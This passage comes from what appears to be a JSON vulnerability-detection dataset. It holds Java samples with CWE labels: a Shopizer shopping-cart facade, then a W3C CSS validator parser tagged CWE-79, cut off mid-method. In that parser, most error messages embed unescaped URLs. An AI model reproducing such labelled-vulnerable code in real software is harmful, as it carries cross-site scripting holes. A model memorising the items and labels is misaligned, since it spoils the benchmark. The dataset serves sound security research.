shoppingCartData.setUnavailables(unavailables);*/\n        \n        return shoppingCartData;\n\n    }\n\n    //@Override\n    public ShoppingCartData getShoppingCartData( final ShoppingCart shoppingCartModel, Language language)\n        throws Exception\n    {\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        return shoppingCartDataPopulator.populate( shoppingCartModel, merchantStore, language );\n    }\n\n\t@Override\n    public ShoppingCartData removeCartItem( final Long itemID, final String cartId ,final MerchantStore store,final Language language )\n        throws Exception\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n                {\n                    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> shoppingCartItemSet =\n                        new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n                    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n                    {\n                        if(shoppingCartItem.getId().longValue() == itemID.longValue() )\n                        {\n                    \t\tshoppingCartService.deleteShoppingCartItem(itemID);\n                        } else {\n                            shoppingCartItemSet.add(shoppingCartItem);\n                        }\n                    }\n                    \n                    cartModel.setLineItems(shoppingCartItemSet);\n\n\n                    ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                    shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                    shoppingCartDataPopulator.setPricingService( pricingService );\n                    shoppingCartDataPopulator.setimageUtils(imageUtils);\n                    return shoppingCartDataPopulator.populate( cartModel, store, language );\n                    \n\n                }\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public ShoppingCartData updateCartItem( final Long itemID, final String cartId, final long newQuantity,final MerchantStore store, final Language language )\n        throws Exception\n    {\n        if ( newQuantity < 1 )\n        {\n            throw new CartModificationException( \"Quantity must not be less than one\" );\n        }\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                    getEntryToUpdate( itemID.longValue(), cartModel );\n\n                if ( entryToUpdate == null )\n                {\n                    throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + newQuantity );\n                entryToUpdate.setQuantity( (int) newQuantity );\n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                final FinalPrice finalPrice =\n                    productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                shoppingCartService.saveOrUpdate( cartModel );\n\n                LOG.info( \"Cart entry updated with desired quantity\" );\n                ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                shoppingCartDataPopulator.setPricingService( pricingService );\n                shoppingCartDataPopulator.setimageUtils(imageUtils);\n                return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n            }\n        }\n        return null;\n    }\n    \n    @Override\n    public ShoppingCartData updateCartItems( final List<ShoppingCartItem> shoppingCartItems, final MerchantStore store, final Language language )\n            throws Exception\n        {\n    \t\n    \t\tValidate.notEmpty(shoppingCartItems,\"shoppingCartItems null or empty\");\n    \t\tShoppingCart cartModel = null;\n    \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n    \t\tfor(ShoppingCartItem item : shoppingCartItems) {\n    \t\t\t\n    \t\t\tif(item.getQuantity()<1) {\n    \t\t\t\tthrow new CartModificationException( \"Quantity must not be less than one\" );\n    \t\t\t}\n    \t\t\t\n    \t\t\tif(cartModel==null) {\n    \t\t\t\tcartModel = getCartModel( item.getCode(), store );\n    \t\t\t}\n    \t\t\t\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                        getEntryToUpdate( item.getId(), cartModel );\n\n                if ( entryToUpdate == null ) {\n                        throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + item.getQuantity() );\n                entryToUpdate.setQuantity( (int) item.getQuantity() );\n                \n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                \n                final FinalPrice finalPrice =\n                        productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                    \n\n                cartItems.add(entryToUpdate);\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t}\n    \t\t\n    \t\tcartModel.setLineItems(cartItems);\n    \t\tshoppingCartService.saveOrUpdate( cartModel );\n\n    \t\t\n            LOG.info( \"Cart entry updated with desired quantity\" );\n            ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n            shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n            shoppingCartDataPopulator.setPricingService( pricingService );\n            shoppingCartDataPopulator.setimageUtils(imageUtils);\n            return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n        }\n\n\n    private ShoppingCart getCartModel( final String cartId,final MerchantStore store )\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n           try\n            {\n                return shoppingCartService.getByCode( cartId, store );\n            }\n            catch ( ServiceException e )\n            {\n                LOG.error( \"unable to find any cart asscoiated with this Id: \" + cartId );\n                LOG.error( \"error while fetching cart model...\", e );\n                return null;\n            }\n            catch( NoResultException nre) {\n           \t//nothing\n            }\n\n        }\n        return null;\n    }\n\n\t@Override\n\tpublic ShoppingCartData getShoppingCartData(String code, MerchantStore store, Language language) {\n\t\ttry {\n\t\t\tShoppingCart cartModel = shoppingCartService.getByCode( code, store );\n\t\t\tif(cartModel!=null) {\n\t\t\t\tShoppingCartData cart = getShoppingCartData(cartModel, language);\n\t\t\t\treturn cart;\n\t\t\t}\n\t\t} catch( NoResultException nre) {\n\t        \t//nothing\n\n\t\t} catch(Exception e) {\n\t\t\tLOG.error(\"Cannot retrieve cart code \" + code,e);\n\t\t}\n\n\n\t\treturn null;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(String shoppingCartCode,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCode( shoppingCartCode, store );\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Customer customer,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCustomer(customer);\n\t}\n\n\t@Override\n\tpublic void saveOrUpdateShoppingCart(ShoppingCart cart) throws Exception {\n\t\tshoppingCartService.saveOrUpdate(cart);\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getCart(Customer customer, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\t\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\tif(cartModel == null) {\n\t\t\treturn null;\n\t\t}\n\t\t\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart addToCart(PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\t//if cart does not exist create a new one\n\n\t\tShoppingCart cartModel = new ShoppingCart();\n\t\tcartModel.setMerchantStore(store);\n\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\n\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\n\t@Override\n\tpublic void removeShoppingCartItem(String cartCode, Long productId,\n\t      MerchantStore merchant, Language language) throws Exception {\n\t    Validate.notNull(cartCode, \"Shopping cart code must not be null\");\n\t    Validate.notNull(productId, \"product id must not be null\");\n\t    Validate.notNull(merchant, \"MerchantStore must not be null\");\n\t    \n\t  \n\t    //get cart\n\t    ShoppingCart cart = getCartModel(cartCode, merchant);\n\t    \n\t    if(cart == null) {\n\t      throw new ResourceNotFoundException(\"Cart code [ \" + cartCode + \" ] not found\");\n\t    }\n\t    \n\t    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    com.salesmanager.core.model.shoppingcart.ShoppingCartItem itemToDelete = null;\n\t    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cart.getLineItems() )\n        {\n            if ( shoppingCartItem.getProduct().getId().longValue() == productId.longValue() )\n            {\n                //get cart item\n                itemToDelete =\n                    getEntryToUpdate( shoppingCartItem.getId(), cart );\n                \n                \n                //break;\n\n            } else {\n              items.add(shoppingCartItem);\n            }\n        }\n\t    //delete item\n\t    if(itemToDelete!=null) {\n\t      shoppingCartService.deleteShoppingCartItem(itemToDelete.getId());\n\t    }\n        \n        //remaining items\n\t    if(items.size()>0) {\n\t    \tcart.setLineItems(items);\n\t    } else {\n\t    \tcart.getLineItems().clear();\n\t    }\n\n        //if(items.size()>0) {\n          shoppingCartService.saveOrUpdate(cart);//update cart with remaining items\n          //ReadableShoppingCart readableShoppingCart = this.getByCode(cartCode, merchant, language);\n        //}\n\n\t}\n\t\n\tprivate ReadableShoppingCart readableShoppingCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\t\t\n\t\t//need to check if the item is already in the cart\n        boolean duplicateFound = false;\n        //only if item has no attributes\n        if(CollectionUtils.isEmpty(item.getAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==item.getProduct().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!itemModel.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + item.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        } \n        \n        if(!duplicateFound) {\n        \tcartModel.getLineItems().add( itemModel );\n        }\n        \n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\tprivate ReadableShoppingCart modifyCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\n        boolean itemModified = false;\n        //check if existing product\n       \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = cartModel.getLineItems();\n       \t//com.salesmanager.core.model.shoppingcart.ShoppingCartItem affectedItem = null;\n       \tif(!CollectionUtils.isEmpty(items)) {\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> newItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> removeItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem anItem : items) {//take care of existing product\n\t    \t\tif(itemModel.getProduct().getId().longValue() == anItem.getProduct().getId()) {\n\t    \t\t\tif(item.getQuantity()==0) {//left aside item to be removed\n\t    \t\t\t\t//don't add it to new list of item\n\t    \t\t\t\tremoveItems.add(anItem);\n\t    \t\t\t} else {\n\t    \t\t\t\t//new quantity\n\t    \t\t\t\tanItem.setQuantity(item.getQuantity());\n\t    \t\t\t\tnewItems.add(anItem);\n\t    \t\t\t}\n\t    \t\t\titemModified = true;\n\t    \t\t} else {\n\t    \t\t\tnewItems.add(anItem);\n\t    \t\t}\n\t    \t}\n\t    \t\n\t    \tif(!removeItems.isEmpty()) {\n\t    \t\tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem emptyItem : removeItems) {\n\t    \t\t\tshoppingCartService.deleteShoppingCartItem(emptyItem.getId());\n\t    \t\t}\n\t    \t\t\n\t    \t}\n\t    \t\n\t    \tif(!itemModified) {\n\t    \t  newItems.add(itemModel);\n\t    \t}\n\t    \t\n\t    \tif(newItems.isEmpty()) {\n\t    \t\tnewItems = null;\n\t    \t}\n\t    \t\n\t    \tcartModel.setLineItems(newItems);\n       \t} else {\n           \t//new item\n             if(item.getQuantity() > 0) {\n                cartModel.getLineItems().add( itemModel );\n             }\n       \t}\n\n       \t//if cart items are null just return cart with no items\n\n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n        \n        if(cartModel==null) {\n        \treturn null;\n        }\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart addToCart(Customer customer, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\tif(item.getQuantity() < 1) item.setQuantity(1);\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\t//if cart does not exist create a new one\n\t\tif(cartModel==null) {\n\t\t\tcartModel = new ShoppingCart();\n\t\t\tcartModel.setCustomerId(customer.getId());\n\t\t\tcartModel.setMerchantStore(store);\n\t\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\t\t}\n\t\t\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart modifyCart(String cartCode, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\n\t\tValidate.notNull(cartCode,\"PString cart code cannot be null\");\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\tShoppingCart cartModel = this.getCartModel(cartCode, store);\n\n\n\t\treturn modifyCart(cartModel,item, store, language);\n\t\t\n\t\t\n\t}\n\t\n\tprivate void saveShoppingCart(ShoppingCart shoppingCart) throws Exception {\n\t\tshoppingCartService.save(shoppingCart);\n\t}\n\t\n\tprivate String uniqueShoppingCartCode() {\n\t\treturn UUID.randomUUID().toString().replaceAll( \"-\", \"\" );\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getById(Long shoppingCartId, MerchantStore store, Language language) throws Exception {\n\n\t\tShoppingCart cart = shoppingCartService.getById(shoppingCartId);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableShoppingCart.populate(cart, readableCart,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Long id, MerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getById(id);\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getByCode(String code, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tShoppingCart cart = shoppingCartService.getByCode(code, store);\n\t\t\n\t\tReadableShoppingCart readableCart = null;\n\t\t\n\t\tif(cart != null) {\n\t\t\t\n\t        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n\t        \n\t        readableShoppingCart.setImageUtils(imageUtils);\n\t        readableShoppingCart.setPricingService(pricingService);\n\t        readableShoppingCart.setProductAttributeService(productAttributeService);\n\t        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n\n\t        readableCart = readableShoppingCart.populate(cart, null,  store, language);\n\t\t\t\n\t\t\t\n\t\t}\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "TreeVul",
    "idx": 700165,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "//\n// $Id$\n// From Philippe Le Hegaret (Philippe.Le_Hegaret@sophia.inria.fr)\n//\n// (c) COPYRIGHT MIT and INRIA, 1997.\n// Please first read the full copyright statement in file COPYRIGHT.html\n\npackage org.w3c.css.css;\n\nimport org.w3c.css.atrules.css.AtRuleMedia;\nimport org.w3c.css.atrules.css.AtRulePage;\nimport org.w3c.css.parser.AtRule;\nimport org.w3c.css.parser.CssError;\nimport org.w3c.css.parser.CssFouffa;\nimport org.w3c.css.parser.CssParseException;\nimport org.w3c.css.parser.CssSelectors;\nimport org.w3c.css.parser.CssValidatorListener;\nimport org.w3c.css.parser.Errors;\nimport org.w3c.css.parser.analyzer.ParseException;\nimport org.w3c.css.parser.analyzer.TokenMgrError;\nimport org.w3c.css.properties.css.CssProperty;\nimport org.w3c.css.selectors.IdSelector;\nimport org.w3c.css.util.ApplContext;\nimport org.w3c.css.util.CssVersion;\nimport org.w3c.css.util.InvalidParamException;\nimport org.w3c.css.util.Messages;\nimport org.w3c.css.util.Util;\nimport org.w3c.css.util.Warning;\nimport org.w3c.css.util.Warnings;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.io.StringReader;\nimport java.io.UnsupportedEncodingException;\nimport java.lang.reflect.Constructor;\nimport java.net.URL;\nimport java.util.ArrayList;\nimport java.util.StringTokenizer;\n\n/**\n * @version $Revision$\n */\npublic final class StyleSheetParser\n        implements CssValidatorListener, CssParser {\n\n    private static Constructor co = null;\n\n    static {\n        try {\n            Class c = java.lang.Exception.class;\n            Class cp[] = {java.lang.Exception.class};\n            co = c.getDeclaredConstructor(cp);\n        } catch (NoSuchMethodException ex) {\n            co = null;\n        }\n    }\n\n    CssFouffa cssFouffa;\n    StyleSheet style = new StyleSheet();\n\n    public void reInit() {\n        style = new StyleSheet();\n    }\n\n    public StyleSheet getStyleSheet() {\n        return style;\n    }\n\n    public void setWarningLevel(int warningLevel) {\n        style.setWarningLevel(warningLevel);\n    }\n\n    public void notifyErrors(Errors errors) {\n        style.addErrors(errors);\n    }\n\n    public void notifyWarnings(Warnings warnings) {\n        style.addWarnings(warnings);\n    }\n\n    /**\n     * Adds a vector of properties to a selector.\n     *\n     * @param selector   the selector\n     * @param properties Properties to associate with contexts\n     */\n    public void handleRule(ApplContext ac, CssSelectors selector,\n                           ArrayList<CssProperty> properties) {\n        if (selector.getAtRule() instanceof AtRulePage) {\n            style.remove(selector);\n        }\n        for (CssProperty property : properties) {\n            property.setSelectors(selector);\n            style.addProperty(selector, property);\n        }\n    }\n\n    // part added by Sijtsche de Jong\n\n    public void addCharSet(String charset) {\n        style.addCharSet(charset);\n    }\n\n    public void newAtRule(AtRule atRule) {\n        style.newAtRule(atRule);\n    }\n\n    public void endOfAtRule() {\n        style.endOfAtRule();\n    }\n\n    public void setImportant(boolean important) {\n        style.setImportant(important);\n    }\n\n    public void setSelectorList(ArrayList<CssSelectors> selectors) {\n        style.setSelectorList(selectors);\n    }\n\n    public void setProperty(ArrayList<CssProperty> properties) {\n        style.setProperty(properties);\n    }\n\n    public void endOfRule() {\n        style.endOfRule();\n    }\n\n    public void removeThisRule() {\n        style.removeThisRule();\n    }\n\n    public void removeThisAtRule() {\n        style.removeThisAtRule();\n    }\n\n    //end of part added by Sijtsche de Jong\n\n    /**\n     * Handles an at-rule.\n     * <p/>\n     * <p>The parameter <code>value</code> can be :\n     * <DL>\n     * <DT>CssString\n     * <DD>The value coming from a string.\n     * <DT>CssURL\n     * <DD>The value coming from an URL.\n     * <DT>Vector\n     * <DD>The value is a vector of declarations (it contains properties).\n     * This feature is not legal, so be careful.\n     * </DL>\n     *\n     * @param ident  The ident for this at-rule (for example: 'font-face')\n     * @param string The string representation if this at-rule\n     */\n    public void handleAtRule(ApplContext ac, String ident, String string) {\n        style.getWarnings().addWarning(new Warning(cssFouffa.getSourceFile(),\n                cssFouffa.getLine(),\n                \"at-rule\",\n                2,\n                new String[]{ident, string},\n                ac));\n        //stylesheet.addAtRule(atRule);\n    }\n\n    /**\n     * @param url    the URL containing the style sheet\n     * @param title  the title of the stylesheet\n     * @param kind   may be a stylesheet or an alternate stylesheet\n     * @param media  the media to apply this\n     * @param origin the origin of the style sheet\n     * @throws IOException an IO error\n     */\n    public void parseURL(ApplContext ac, URL url, String title,\n                         String kind, String media,\n                         int origin) {\n        boolean doneref = false;\n        URL ref = ac.getReferrer();\n        setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseURL(\" + url + \", \"\n                    + title + \", \"\n                    + kind + \", \" + media + \", \"\n                    + origin + \")\");\n        }\n        if (kind != null) {\n            kind = kind.trim().toLowerCase();\n            if (!kind.equals(\"stylesheet\") && !kind.equals(\"alternate stylesheet\")) {\n                return;\n            }\n        }\n        try {\n            ac.setOrigin(origin);\n//\t    if (cssFouffa == null) {\n            cssFouffa = new CssFouffa(ac, url);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, url);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n\n            // removed plh 2001-03-08\n            // cssFouffa.setOrigin(origin);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null) {\n                if (ac.getCssVersion() != CssVersion.CSS1) {\n                    if (ac.getMedium() == null) {\n                        media = \"all\";\n                    } else {\n                        media = ac.getMedium();\n                    }\n                }\n            }\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (Exception e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(Messages.escapeString(url.toString()),\n                    -1, e));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    // add media, easy version for CSS version < 3, otherwise, reuse the parser\n    private void addMedias(AtRuleMedia m, String medias, ApplContext ac) throws InvalidParamException {\n        // before CSS3, let's parse it the easy way...\n        if (ac.getCssVersion().compareTo(CssVersion.CSS3) < 0) {\n            StringTokenizer tokens = new StringTokenizer(medias, \",\");\n            while (tokens.hasMoreTokens()) {\n                m.addMedia(null, tokens.nextToken().trim(), ac);\n            }\n        } else {\n            CssFouffa muP = new CssFouffa(ac, new StringReader(medias));\n            try {\n                AtRuleMedia arm = muP.parseMediaDeclaration();\n                if (arm != null) {\n                    m.allMedia = arm.allMedia;\n                }\n            } catch (ParseException pex) {\n                // error already added, so nothing else to do\n            }\n        }\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param reader the reader containing the style data\n     * @param url    the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, Reader reader,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        boolean doneref = false;\n        style.setWarningLevel(ac.getWarningLevel());\n        if (Util.onDebug) {\n            System.err.println(\"StyleSheet.parseStyleElement(\" + title + \", \"\n                    + media + \", \" + url\n                    + \",\" + lineno + \")\");\n        }\n        URL ref = ac.getReferrer();\n        try {\n\n//\t    if (cssFouffa == null) {\n            String charset = ac.getCharsetForURL(url);\n            cssFouffa = new CssFouffa(ac, reader, url, lineno);\n            cssFouffa.addListener(this);\n//\t    } else {\n//\t\tcssFouffa.ReInit(ac, input, url, lineno);\n//\t    }\n\n            //\t    cssFouffa.setResponse(res);\n            //\t    cssFouffa.setDefaultMedium(defaultmedium);\n            //\t    cssFouffa.doConfig();\n            if (media == null && ac.getCssVersion() != CssVersion.CSS1) {\n                media = \"all\";\n            }\n\n            AtRuleMedia m = AtRuleMedia.getInstance(ac.getCssVersion());\n            try {\n                if (media != null) {\n                    addMedias(m, media, ac);\n                }\n                cssFouffa.setAtRule(m);\n            } catch (org.w3c.css.util.InvalidParamException e) {\n                Errors er = new Errors();\n                er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                        -1, e));\n                notifyErrors(er);\n                return;\n            }\n            ac.setReferrer(url);\n            doneref = true;\n            cssFouffa.parseStyle();\n        } catch (IOException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, e));\n            notifyErrors(er);\n        } catch (TokenMgrError e) {\n            Errors er = new Errors();\n            CssParseException cpe = null;\n            if (co != null) {\n                try {\n                    Object o[] = new Object[1];\n                    o[0] = e;\n                    Exception new_e = (Exception) co.newInstance(o);\n                    cpe = new CssParseException(new_e);\n                } catch (Exception ex) {\n                    cpe = null;\n                }\n            }\n            if (cpe == null) {\n                cpe = new CssParseException(new Exception(e.getMessage()));\n            }\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1,\n                    //e.getErrorLine(),\n                    cpe));\n            notifyErrors(er);\n        } catch (RuntimeException e) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    cssFouffa.getLine(),\n                    new CssParseException(e)));\n            notifyErrors(er);\n        } finally {\n            if (doneref) {\n                ac.setReferrer(ref);\n            }\n        }\n    }\n\n    /**\n     * @param input the inputStream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     * @see #parseStyleElement(ApplContext, InputStream, String, String, URL, int)\n     * @deprecated Replaced by parseStyleElement\n     */\n    public void parseStyleElement(ApplContext ac, String input, URL url, int lineno) {\n        parseStyleElement(ac, new StringReader(input), null, null, url, lineno);\n    }\n\n    /**\n     * Parse a style element. The Style element always comes from the user\n     *\n     * @param input the input stream containing the style data\n     * @param url   the name of the file the style element was read in.\n     * @throws IOException an IO error\n     */\n    public void parseStyleElement(ApplContext ac, InputStream input,\n                                  String title, String media,\n                                  URL url, int lineno) {\n        InputStreamReader reader = null;\n        String charset = ac.getCharsetForURL(url);\n        try {\n            reader = new InputStreamReader(input, (charset == null) ?\n                    \"iso-8859-1\" : charset);\n        } catch (UnsupportedEncodingException uex) {\n            Errors er = new Errors();\n            er.addError(new org.w3c.css.parser.CssError(url.toString(),\n                    -1, uex));\n            